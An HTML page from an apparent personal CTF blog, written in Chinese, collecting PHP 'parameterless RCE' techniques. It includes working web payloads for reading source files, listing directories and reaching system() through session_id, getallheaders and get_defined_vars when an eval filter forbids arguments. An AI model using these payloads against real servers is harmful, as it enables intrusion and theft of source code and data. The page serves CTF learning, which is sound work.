@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="无参数RCE无参数RCE绕过思路 - yankun 相关函数PHP: 目录 - Manual PHP: 变量处理函数 - Manual 12345678910111213141516171819202122scandir(&#x27;.&#x27;)glob(&#x27;*&#x27;)?&gt;&lt;?php $a&#x3D;new DirectoryIterator(&quot;glob:&#x2F;&#x2F;&#x2F;*&amp;q">
+<meta property="og:type" content="article">
+<meta property="og:title" content="无参数rce">
+<meta property="og:url" content="http://example.com/2026/01/28/%E6%97%A0%E5%8F%82%E6%95%B0rce/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="无参数RCE无参数RCE绕过思路 - yankun 相关函数PHP: 目录 - Manual PHP: 变量处理函数 - Manual 12345678910111213141516171819202122scandir(&#x27;.&#x27;)glob(&#x27;*&#x27;)?&gt;&lt;?php $a&#x3D;new DirectoryIterator(&quot;glob:&#x2F;&#x2F;&#x2F;*&amp;q">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20260109172608231.png">
+<meta property="article:published_time" content="2026-01-28T10:34:10.000Z">
+<meta property="article:modified_time" content="2026-01-28T10:45:58.552Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="无参数RCE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20260109172608231.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>无参数rce</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="Hexo" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/lierbushiwo">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2026/01/28/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2026/01/28/%E6%97%A0%E5%9B%9E%E6%98%BErce/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2026/01/28/%E6%97%A0%E5%8F%82%E6%95%B0rce/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2026/01/28/%E6%97%A0%E5%8F%82%E6%95%B0rce/&text=无参数rce"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2026/01/28/%E6%97%A0%E5%8F%82%E6%95%B0rce/&title=无参数rce"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2026/01/28/%E6%97%A0%E5%8F%82%E6%95%B0rce/&is_video=false&description=无参数rce"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=无参数rce&body=Check out this article: http://example.com/2026/01/28/%E6%97%A0%E5%8F%82%E6%95%B0rce/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2026/01/28/%E6%97%A0%E5%8F%82%E6%95%B0rce/&title=无参数rce"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2026/01/28/%E6%97%A0%E5%8F%82%E6%95%B0rce/&title=无参数rce"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2026/01/28/%E6%97%A0%E5%8F%82%E6%95%B0rce/&title=无参数rce"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2026/01/28/%E6%97%A0%E5%8F%82%E6%95%B0rce/&title=无参数rce"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2026/01/28/%E6%97%A0%E5%8F%82%E6%95%B0rce/&name=无参数rce&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2026/01/28/%E6%97%A0%E5%8F%82%E6%95%B0rce/&t=无参数rce"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%8F%82%E6%95%B0RCE"><span class="toc-number">1.</span> <span class="toc-text">无参数RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.</span> <span class="toc-text">相关函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.</span> <span class="toc-text">参数函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%B9%E8%BF%94%E5%9B%9E%E5%80%BC%E8%BF%9B%E8%A1%8C%E6%93%8D%E4%BD%9C"><span class="toc-number">1.2.1.</span> <span class="toc-text">对返回值进行操作</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8E%A5%E5%8F%97%E5%8F%82%E6%95%B0%E7%B1%BB%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.2.</span> <span class="toc-text">接受参数类函数</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#session-id"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">session_id()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#getallheaders"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">getallheaders()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#get-defined-vars"><span class="toc-number">1.2.2.3.</span> <span class="toc-text">get_defined_vars()</span></a></li></ol></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        无参数rce
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">John Doe</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2026-01-28T10:34:10.000Z" class="dt-published" itemprop="datePublished">2026-01-28</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/RCE/" rel="tag">RCE</a>, <a class="p-category" href="/tags/%E6%97%A0%E5%8F%82%E6%95%B0RCE/" rel="tag">无参数RCE</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h2><p><a target="_blank" rel="noopener" href="https://yankun8.github.io/blog/2025/01/29/PHP/%E6%97%A0%E5%8F%82%E6%95%B0rce/">无参数RCE绕过思路 - yankun</a></p>
+<h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/book.dir.php">PHP: 目录 - Manual</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/ref.var.php">PHP: 变量处理函数 - Manual</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line"><span class="title function_ invoke__">glob</span>(<span class="string">&#x27;*&#x27;</span>)</span><br><span class="line"><span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27; &#x27;</span>);&#125;</span><br><span class="line"><span class="comment">// glob://伪协议结合原生类列目录</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>();</span><br><span class="line"><span class="keyword">echo</span>();</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>();</span><br><span class="line"><span class="title function_ invoke__">print_r</span>();</span><br><span class="line"><span class="title function_ invoke__">var_export</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>()</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">implode</span>()</span><br><span class="line">    </span><br><span class="line"><span class="title function_ invoke__">show_source</span>();</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>();</span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>();</span><br><span class="line"><span class="keyword">include</span>();</span><br><span class="line"><span class="keyword">require</span>();</span><br><span class="line"><span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&#x27;php://filter/convert.base64-encode/resource=/var/www/html/index.php&#x27;</span>);<span class="comment">// 原生类读文件</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">dirname</span>():函数返回路径中的目录部分</span><br><span class="line"><span class="title function_ invoke__">chdir</span>() ：函数改变当前的目录。</span><br></pre></td></tr></table></figure>
+
+<h3 id="参数函数"><a href="#参数函数" class="headerlink" title="参数函数"></a>参数函数</h3><ul>
+<li>特定函数返回值，需要进行处理如数组操作、字符串操作</li>
+<li>各种接受参数类函数</li>
+</ul>
+<blockquote>
+<p>操作数组、字符串函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">strrev</span>():用于反转给定字符串</span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">current</span>() ：返回数组中的单元，默认取第一个值。<span class="title function_ invoke__">pos</span>()和<span class="title function_ invoke__">current</span>()是同一个东西</span><br><span class="line"><span class="title function_ invoke__">end</span>() - 将数组的内部指针指向最后一个单元</span><br><span class="line"><span class="title function_ invoke__">key</span>() - 从关联数组中取得键名</span><br><span class="line"><span class="title function_ invoke__">each</span>() - 返回数组中当前的键／值对并将数组指针向前移动一步</span><br><span class="line"><span class="title function_ invoke__">prev</span>() - 将数组的内部指针倒回一位</span><br><span class="line"><span class="title function_ invoke__">reset</span>() - 将数组的内部指针指向第一个单元</span><br><span class="line"><span class="title function_ invoke__">next</span>() - 将数组中的内部指针向前移动一位</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">array_flip</span>() :交换数组中的键和值，成功时返回交换后的数组</span><br><span class="line"><span class="title function_ invoke__">array_rand</span>() :从数组中随机取出一个或多个单元</span><br><span class="line"><span class="title function_ invoke__">array_reverse</span>():将数组内容反转</span><br></pre></td></tr></table></figure></blockquote>
+<h4 id="对返回值进行操作"><a href="#对返回值进行操作" class="headerlink" title="对返回值进行操作"></a>对返回值进行操作</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">getcwd</span>() :取得当前工作目录</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>())))); <span class="comment">//查看和读取当前目录文件</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">getcwd</span>()))); <span class="comment">// 可以嵌套遍历文件</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>()))));  <span class="comment">//查看上一级目录的文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//. 的获取 chr(46)也可以 其中46通过各种方式获取 这个点没见考过这里不再深入研究了，只提供几个思考角度</span></span><br><span class="line">    <span class="comment">//随机数 时间 版本号之后进行数学处理</span></span><br><span class="line"><span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())</span><br></pre></td></tr></table></figure>
+
+<h4 id="接受参数类函数"><a href="#接受参数类函数" class="headerlink" title="接受参数类函数"></a>接受参数类函数</h4><h5 id="session-id"><a href="#session-id" class="headerlink" title="session_id()"></a><code>session_id()</code></h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?code=<span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">session_id</span>(<span class="title function_ invoke__">session_start</span>())); </span><br><span class="line">Cookie: PHPSESSID=index.php</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>文件会话处理程序可能仅允许会话 ID 中使用以下字符：<code>[a-zA-Z0-9,-]</code></p>
+<p>通过<code>hex2bin</code>和<code>bin2hex</code>函数bypass</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; <span class="built_in">echo</span> bin2hex(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">666c61672e706870</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20260109172608231.png" alt="image-20260109172608122"></p>
+</blockquote>
+<h5 id="getallheaders"><a href="#getallheaders" class="headerlink" title="getallheaders()"></a><code>getallheaders()</code></h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">getallheaders</span>()));</span><br></pre></td></tr></table></figure>
+
+<h5 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a><code>get_defined_vars()</code></h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">get_defined_vars</span>())));&amp;a=system</span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/lierbushiwo">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%8F%82%E6%95%B0RCE"><span class="toc-number">1.</span> <span class="toc-text">无参数RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.</span> <span class="toc-text">相关函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.</span> <span class="toc-text">参数函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%B9%E8%BF%94%E5%9B%9E%E5%80%BC%E8%BF%9B%E8%A1%8C%E6%93%8D%E4%BD%9C"><span class="toc-number">1.2.1.</span> <span class="toc-text">对返回值进行操作</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8E%A5%E5%8F%97%E5%8F%82%E6%95%B0%E7%B1%BB%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.2.</span> <span class="toc-text">接受参数类函数</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#session-id"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">session_id()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#getallheaders"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">getallheaders()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#get-defined-vars"><span class="toc-number">1.2.2.3.</span> <span class="toc-text">get_defined_vars()</span></a></li></ol></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2026/01/28/%E6%97%A0%E5%8F%82%E6%95%B0rce/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2026/01/28/%E6%97%A0%E5%8F%82%E6%95%B0rce/&text=无参数rce"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2026/01/28/%E6%97%A0%E5%8F%82%E6%95%B0rce/&title=无参数rce"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2026/01/28/%E6%97%A0%E5%8F%82%E6%95%B0rce/&is_video=false&description=无参数rce"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=无参数rce&body=Check out this article: http://example.com/2026/01/28/%E6%97%A0%E5%8F%82%E6%95%B0rce/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2026/01/28/%E6%97%A0%E5%8F%82%E6%95%B0rce/&title=无参数rce"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2026/01/28/%E6%97%A0%E5%8F%82%E6%95%B0rce/&title=无参数rce"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2026/01/28/%E6%97%A0%E5%8F%82%E6%95%B0rce/&title=无参数rce"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2026/01/28/%E6%97%A0%E5%8F%82%E6%95%B0rce/&title=无参数rce"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2026/01/28/%E6%97%A0%E5%8F%82%E6%95%B0rce/&name=无参数rce&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2026/01/28/%E6%97%A0%E5%8F%82%E6%95%B0rce/&t=无参数rce"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2026
+    John Doe
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/lierbushiwo">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
